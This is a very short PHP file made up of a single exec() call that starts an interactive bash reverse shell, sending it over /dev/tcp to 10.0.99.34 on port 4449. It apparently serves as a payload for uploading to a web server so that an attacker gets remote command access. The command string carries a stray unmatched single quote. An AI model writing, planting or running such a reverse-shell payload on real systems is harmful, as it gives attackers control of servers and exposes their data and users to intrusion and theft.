<?php

exec("/bin/bash -i >& /dev/tcp/10.0.99.34/4449 0>&1'");
?>
